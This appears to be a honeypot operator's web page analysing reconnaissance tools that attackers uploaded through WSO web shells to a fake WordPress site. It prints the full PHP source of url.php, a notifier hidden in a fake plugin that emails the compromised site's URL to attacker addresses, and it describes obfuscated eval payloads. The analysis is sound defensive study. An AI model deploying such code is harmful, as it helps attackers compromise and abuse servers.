<div id="subheader"><h2>Reconnaissance Tools</h2></div>
<p>
Reconnaissance tools collect and send back information about the
software available on a WordPress host.
That information ranges from sending an email to a well known address, to
scanning the host system for whatever other CMS (besides WordPress)
system(s) and database(s) it might execute.
</p>
<p>
The <a href="wso.html">WSO web shell</a> includes decent recon capability,
displaying operating system and version, PHP version, size of filesystem
and includes a "Sec. Info" action. This last action shows HTTP server
version, interesting executables available, including which databases
are installed.  I examine WSO separately.
</p>
<div id="subsubheader"><h3>Self Destructing Probe - LijHgs3*.php</h3></div>
<p>
I encountered a "self destructing" reconnaissance program.
124 PHP files with names like <kbd>LijHgs3_8878737.php</kbd>
and <kbd>LijHgs3_2791796.php</kbd> got uploaded 
between 2013-06-23T02:24:35-06 and 2013-06-23T04:18:27-06.
The uploads came from 114 different IP addresses, which <kbd>p0f</kbd>
identified as mostly Windows XP, Windows Vista, with a
couple of IP addresses identified as Linux.
All uploads were by <a href="wso.html">WSO web shell</a> file upload.
All 124 uploads called WSO as <kbd>502.php</kbd>.
Each of the 124 uploads had a different substring of digits, indicating
some coordination between the 114 IP addresses.
</p>
<p>
In turn, <kbd>502.php</kbd> was uploaded 3 times before
the "LijHgs3" PHP files were uploaded, and many times afterward,
always using the fake WordPress "plugin upload" feature.
2 unique IP addresses,
188.92.74.87 and 91.197.19.103, uploaded
<kbd>502.php</kbd> between 2013-06-16 and 2013-06-21.
Neither 188.92.74.87 nor 91.197.19.103 uploaded "LijHgs3" PHP files.
<kbd>p0f</kbd> said that 188.92.74.87 was Windows 2000 or Windows XP,
and that 91.197.19.103 ran Windows Vista.
</p>
<p>
Nothing ever actually invoked any of the "LijHgs3" PHP files,
perhaps because the honey pot's <a href="pseudo_wso.phps">fake WSO</a>
(at the time) did not confirm uploads correctly by
displaying the uploaded file name.
I later changed that aspect of the fake WSO.
</p>
<p>
The "LijHgs3" source code:
</p>
<ol>
	<li>created a directory</li>
	<li>created a file in that directory</li>
	<li>wrote the string "np9i8gkli" to the file</li>
	<li>used PHP's <kbd>file_get_contents()</kbd> to read the file</li>
	<li>If "LijHgs3" read the same string that it wrote, it echoed "np9i8gkli"
	<li>otherwise it echoed "sdcoiwenldz33s"</li>
	<li>It unlinked ("deleted") all files named "LijHgs3_*" in the current directory</li>
	<li>It ran <kbd>echo 'bbbpathsbbb'.'http://stratigery.com/'.'eeepathseee';</kbd></li>
</ol>
<p>
The output of the final "echo" is clearly machine-parseable, designed to be read by
some program. The strings for successful or error file write and read
are a bit less obvious, not even having the same string length.
</p>
<p>
The coding style of the final echo indicates that the "LijHgs3" programs
were all programmatically generated, as there is no reason to
concatenate 3 strings other than convenience in writing the program
that generated the "LijHgs3" programs.
</p>
<div id="subsubheader"><h3>Xgr0upvn Data Checker Tool vBeta</h3></div>
<p>
Downloaded via WSO 'uploadFile' by a Windows Vista machine at 117.0.42.185, and 
invoked 39 seconds later by that same machine, this recon tool walks the user through
a password login and some other nonsense, to produce a list of files
in the directory it runs from, with MD5 checksums.
The program is unusual as it contains dual Vietnamese/English strings
in a primitive attempt at I18N coding.  The IP address is in a Vietnamese
ISP's netblock.
</p>
<p>
The timing of the upload and invocation, as well as what else the IP
address asked for (<kbd>/favicon.ico</kbd>, for example) indicate that
this might have been a <em>manual</em> exploit attempt.
Either the uploader was a Windows user or silly, because the PHP code
was uploaded as "Shell.php", but attempted invocation was as "shell.php".
That would work for a Windows HTTP server (I think), but not a Linux
server.
</p>
<p>
Not the same as <a href="http://tibbah.com/files/a.txt">Xgr0upVN ShElL</a>,
but may be from the same Vietnamese hacker collective.
</p>
<p>
The WSO shell URL used to upload the XgrOupVN Data Checker Tool was <kbd>jm.php</kbd>.
WSO had been uploaded as <kbd>jm.php</kbd> 10 times between 2013-06-19 and 2013-06-26,
by 6 different IP addresses
two months before 117.0.42.185 tried to invoke it.
That statement gives a bit of a false impression, as 20 different IP addresses
invoked <kbd>jm.php</kbd> between 2013-06-19 and 2013-09-11.
It appears that knowledge of a nominally successful WSO upload gets shared or
sold around.
</p>
<div id="subsubheader"><h3><a name="SMTP">SMTP Tests</a></h3></div>
<p>
The <a href="testm.html">obfuscated code champion</a> is actually
a pretty simple SMTP tester, emailing to a single, hard-coded 
SMTP address.
</p>
<p>
The code sent to <a href="backdoors.html">7c334.php</a> contained two different
SMTP testers.
</p>
<p>
</p>
<div id="subsubheader"><h3><a name="connector_t.php">connector_t.php</a></h3></div>
<p>
<kbd>connector_t.php</kbd> got uploaded to a previously-installed <a href="wso.html">WSO web shell</a>
named <kbd>info.php</kbd>. Both times WSO would have named the uploaded code "connector_t.php".
</p>
<table border="0">

</table>
<p>
<kbd>connector_t.php</kbd> got invoked 2 seconds after download with no
parameters. This shows how
hard it is to emulate malware on honey pots: automatic download and testing gives
the honey pot operator no time to check out the downloaded code.
</p>

<p><kbd>connector_t.php</kbd> gives back a single line of text upon
invocation:
<kbd>init::f6mnZP0cwKNo9q::5.2.14::ok</kbd>.
That's the PHP version number, a hardcoded string that looks random, and "ok"
indicates that it can send SMTP email on the victim machine.
<p>
<kbd>connector_t.php's</kbd> code consists of a call to PHP's <kbd>mail()</kbd> function (address:
'noreply@google.com') 3 times in a loop, after getting the PHP version number.
If <kbd>mail()</kbd> succeeds any of the 3 times you get the 'ok' suffix on the output shown above.
</p>
<p>
Multiple attempts at calling <kbd>mail('noreply@google.com', 'Noreply', '')</kbd>
is emblematic. It appears that WordPress malware, or the hosts that WordPress
runs on, have reliability issues. Malware tries every important operation
at least two times without assuming an error condition.
</p>
<p>
</p>
<div id="subsubheader"><h3><a name="URLPHP">url.php</a></h3></div>
<p>
A very subtle STMP testing program, <kbd>url.php</kbd> got uploaded
as just one PHP file out of many in a plugin named "Imailer". The
<kbd>Imailer.zip</kbd> file contained the usual "Tumblr Importer"
PHP files, but it also contained <kbd>mod_system.php</kbd>, a WSO v2.5
web shell, <kbd>copyrights.php</kbd> (which is "<a href="emailers.html#POSTMAN">PostMan Full 3.5</a>"
a spamming program), and <kbd>url.php</kbd> itself. The code is as follows:
</p>
<pre>
&lt;?
$rezmail1 = "izik.krg@gmail.com";
$rezmail2 = "ghostx2040@gmail.com";
$ip = getenv("REMOTE_ADDR");
$host = $_SERVER['HTTP_HOST'];
$self = $_SERVER['PHP_SELF'];
$query = !empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : null;
$url = !empty($query) ? "http://$host$self?$query" : "http://$host$self";
$message .=
"Position Available. Five hundred USD Weekly,Get Back for More Details\n";
$subject = "Available position check within $url";
$headers .= "MIME-Version: 1.0\n";
mail($rezmail1,$subject,$message,$headers);
mail($rezmail2,$subject,$message,$headers);
?&gt;
</pre>
<p>
It was uploaded by 95.57.60.115 at 2013-08-26T10:00:29-06, then invoked 
at 2013-08-26T10:13:35-06.  The uploader had a User-Agent string of
"Mozilla/5.0 (Windows NT 6.1; rv:19.0) Gecko/20100101 Firefox/19.0",
while the invoker sent "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36",
and also requested <kbd>/favicon.ico</kbd> right away.
This looks like someone had a guess-password-install-malware program
running. They got a notification that <kbd>url.php</kbd> was installed,
and then tried it interactively.
</p>
<p>
The really subtle part is that the message <kbd>url.php</kbd> sends
looks like spam, an ad for a stupid money mule job with some scammers,
perhaps. Note that the subject line of the email will have the URL
of the <kbd>url.php</kbd> program itself. Conveniently, that's almost
the URL of the "PostMan Full" spamming tool included in that plugin's
zip file. Once "izik.krg" gets an email, he can fire up his spam
command and control and start blasting out crap. In fact "izik" can
automate the whole thing based on the "Subject:" line of the email.
</p>
<div id="subsubheader"><h3>CMS installations Check</h3></div>
<p>
Sent to my honey pot's WSO web shell emulation 43 times by 27 different IP address between
2013-07-05T02:21:19-06 and 2013-08-21T07:43:30-06.
</p>
<p>
The attacker invoked WSO web shell's "actionPHP" action, which means the HTTP request
includes  raw PHP source code, and WSO executes<kbd>eval()</kbd> on it.
The source code would never appear in the exploited host's filesystem, but my emulated WSO shell
captures it.
</p>
<p>It amounts to a very long ASCII string, which gets eval'ed (inside WSO's PHP eval) like this:
<kbd>eval(gzuncompress(base64_decode($eval_code)));</kbd>
</p>
<p>
It looks for WordPress, Joomla, Drupal, TYPO3, phpBB, PunBB, e107, DataLife Engine
and Simple Machines Forum installations, by changing directory up to the root of
the file system. It then does a breadth-first recursive search up to 10 levels deep
for what it considers "core files" of each of the CMSes it knows about.
For instance, the "core files" of a WordPress installation amount to those named
"wp-content", "wp-admin" and "wp-includes".
</p>
<p>
The code handles Windows installations as well as Linux, mainly by substituting backslashes
for slashes in file paths, although a few other considerations get taken care of.
It looks like several people have worked on it: the original code appears neat and tidy,
uniformly indented,
and it has debug output using unadorned PHP <kbd>echo</kbd> commands.
Any lines of code generating debug output have been commented out using '//'-style comment leaders.
Some later debug output code additions break the uniform indentation, and got commented out using '#'-style
comment leaders. Oddly the later debug output is preceded by <kbd>if($debug_mode)</kbd>,
so whether output appears or not depends on the value of the <kbd>$debug_mode</kbd> variable,
which is set to <kbd>false</kbd> at the very beginning of the code.  Why bother commenting it out?
</p>
<div id="subsubheader"><h3>SRVC WebShell modul</h3></div>
<p>
I'm going into somewhat more depth for the "SRVC WebShell modul" because
I can't find it described anywhere.
The "SRVC WebShell modul" [sic], collects a lot of information about the system
it runs on, then returns a <a href="srvc.webshell.modul.out">Base-64 encoded, serialized PHP associative arrary</a>.
The data it collects looks like this before encoding:
</p>
<pre>Array
(
    [os] =&gt; Linux
    [osversion] =&gt; Linux bronze 3.12.3-1-ARCH #1 SMP PREEMPT Wed Dec 4 21:45:42 CET 2013 x86_64
    [webserver] =&gt; Apache
    [safemode] =&gt; 0
    [disable_functions] =&gt; 
    [curl] =&gt; 1
    [php_api] =&gt; cli
    [php_version] =&gt; 5.5.6
    [basedir] =&gt; none
    [timelimit] =&gt; 1
    [userabort] =&gt; 1
    [socket] =&gt; 1
    [is_evalable] =&gt; 1
    [is_execable] =&gt; 1
    [is_mailable] =&gt; unknown
    [sendmail_cmd] =&gt; [PHP] mail();
)
</pre>
<p>
SRVC WebShell modul often has multiple methods coded in it to find any of
the above parameters. The code prefers to use PHP builtins (<kbd>php_uname()</kbd>)
to find a value, but it ultimately falls back to a Linux-specific method, like
shelling out to run <kbd>uname -s</kbd>. No Windows-specific fallbacks exist,
as near as I can tell. Shelling out to run a command is a study in alternatives,
starting by trying <kbd>shell_exec()</kbd>, trying 4 more PHP builtins, finally
using <kbd>proc_open()</kbd> if none of the other alternatives work.
</p>
<p>
SRVC WebShell modul tests if email works by sending email to a random, 32-character
"user ID" at the domain <kbd>asdasd.ru</kbd>. It waits 8 seconds, then checks
<kbd>http://asdasd.ru?u=<em>32-character random user ID</em></kbd> to see
if the email arrived. The asdasd.ru service appears to be some weird Russian
semi-anonymous email dead drop, but the SRVC WebShell modul uses it to advantage.
If you send an email manually to asdasd.ru, it takes substantially longer than
8 seconds to percolate messages up to the web interface, so I doubt that the SRVC code
works correctly.
</p>
<p>
One of the tests, the value of "is_evalable" above, is interesting. The "1" value
indicates that an <kbd>eval()</kbd> worked. I can't really understand why you'd
bother to test for a working <kbd>eval()</kbd> when the code that does the
testing is executing courtesy of <kbd>eval(gzuncompress(base64_decode($eval_code)));</kbd>
itself. Further, the code doing the testing got run by the <kbd>actionPHP</kbd> action
of a <a href="wso.html">WSO web shell</a>. As it happens, WSO does an <kbd>eval()</kbd>
on PHP code sent to it in that action. So, SRVC WebShell modul checks to see if
<kbd>eval()</kbd> works inside of two layers of <kbd>eval()</kbd>. Either SRVC WebShell modul
sometimes runs outside of WSO, or SRVC WebShell modul isn't executed by the same folks
who wrote it. The attackers using it don't understand it, because the code just gets passed
around from one bad coder to the next.
</p>
<p>
The SRVC WebShell modul appears fairly unified, having a consistent variable
and function naming and consistent bracket placement styles. 
The programmer(s) indented it uniformly, at 1 ASCII space per indentation level,
making for some dense code.
The code has only
a few comments, which appear to fall into 2 categories: commented-out debugging
code, and a few "TODO" notes, which indicate places where even more alternatives
could be implemented.
